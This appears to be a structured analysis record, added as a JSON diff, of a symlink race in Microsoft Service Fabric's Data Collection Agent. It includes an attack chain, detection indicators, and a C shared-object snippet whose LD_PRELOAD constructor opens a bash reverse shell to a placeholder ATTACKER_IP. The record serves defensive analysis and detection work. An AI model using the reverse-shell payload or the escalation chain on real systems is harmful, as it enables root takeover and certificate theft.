@@ -1,0 +1,107 @@
+{
+  "package_info": {
+    "package_name": "Data Collection Agent (DCA)",
+    "package_manager": "Microsoft Service Fabric (internal component, not a public package manager)",
+    "package_versions": "Versions prior to the June 14, 2022 patch (exact versions not specified)",
+    "why_malicious": "The DCA component contains a race condition vulnerability in its GetIndex function, which can be exploited by attackers to perform arbitrary file writes on the host node from within a Linux container. This enables privilege escalation to root, arbitrary code execution, and full node compromise."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (when DCA processes log directory paths)",
+        "file_location": "GetIndex function in DCA source code",
+        "required_permissions": [
+          "filesystem"
+        ]
+      },
+      "code_snippet": "GetIndex(file_path) {\n  // Reads file, checks content format\n  // Modifies and overwrites content\n  // Vulnerable to symlink race\n}",
+      "code_language": "pseudo-code (original likely C/C++)",
+      "code_behavior": "At runtime, the function reads a file, checks its content, and then overwrites it, but does not securely handle symlinks, allowing an attacker to race and redirect the write to an arbitrary file, resulting in arbitrary file overwrite.",
+      "malice_analysis": {
+        "why_suspicious": "The function allows file overwrites based on attacker-controlled symlinks, enabling arbitrary file writes outside the intended directory.",
+        "violated_expectations": "Normal behavior would restrict file writes to safe, validated paths and avoid following symlinks; the actual behavior allows attacker-controlled file overwrites.",
+        "similar_legitimate_use": "Legitimate log rotation or file update functions, but only when properly handling symlinks and file permissions.",
+        "key_indicators": [
+          "Lack of symlink checks before file overwrite",
+          "Arbitrary file write based on attacker-controlled input"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (after arbitrary file write, when process is started with LD_PRELOAD)",
+        "file_location": "Attacker-written shared object file (e.g., /tmp/malicious.so)",
+        "required_permissions": [
+          "filesystem",
+          "environment_vars",
+          "network"
+        ]
+      },
+      "code_snippet": "/* malicious.so */\n__attribute__((constructor)) void init() {\n  system(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'\");\n}",
+      "code_language": "C",
+      "code_behavior": "At process startup (via LD_PRELOAD), the shared object executes a constructor function that spawns a reverse shell to the attacker's server, enabling remote code execution as root.",
+      "malice_analysis": {
+        "why_suspicious": "The shared object is crafted to execute a reverse shell upon loading, which is a classic post-exploitation technique.",
+        "violated_expectations": "Normal shared objects do not contain constructor functions that spawn shells or connect to external IPs.",
+        "similar_legitimate_use": "Debugging or instrumentation libraries may use constructors, but not for remote shell access.",
+        "key_indicators": [
+          "Use of __attribute__((constructor)) for code execution",
+          "Reverse shell command embedded in shared object",
+          "LD_PRELOAD abuse"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker exploits the race condition in DCA's GetIndex function to overwrite an arbitrary file on the host node.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Ability to place a malicious shared object on the host filesystem."
+    },
+    {
+      "step": 2,
+      "action": "Attacker sets the LD_PRELOAD environment variable to load the malicious shared object during process startup.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Execution of attacker-controlled code as root."
+    },
+    {
+      "step": 3,
+      "action": "Malicious shared object initiates a reverse shell, granting the attacker root access to the node.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker can explore the file system, extract certificates, and further compromise the cluster."
+    },
+    {
+      "step": 4,
+      "action": "Attacker uses compromised certificates to authenticate to API endpoints and trigger cluster functionalities.",
+      "implemented_by": [],
+      "leads_to": "Full cluster compromise and lateral movement."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Repeated file access and overwrites in log directories by DCA",
+      "Unexpected symlink creation and rapid file changes in sensitive directories",
+      "Processes started with LD_PRELOAD set to non-standard or writable locations",
+      "Shared objects with constructor functions that spawn shells or connect to external IPs"
+    ],
+    "file_indicators": [
+      "Presence of attacker-controlled shared objects (e.g., /tmp/malicious.so)",
+      "Unusual symlinks in log or configuration directories",
+      "Unexpected modifications to system files by DCA process"
+    ],
+    "network_indicators": [
+      "Outbound connections from Service Fabric nodes to unknown external IPs/ports (reverse shell behavior)",
+      "Unusual traffic patterns immediately after DCA activity"
+    ],
+    "how_to_detect": "Monitor DCA process activity for repeated file overwrites and symlink usage in log directories. Alert on processes started with LD_PRELOAD set to writable or non-standard paths. Scan for shared objects containing constructor functions that execute shell commands or initiate network connections. Monitor for outbound connections from Service Fabric nodes to external IPs, especially following DCA activity."
+  }
+}
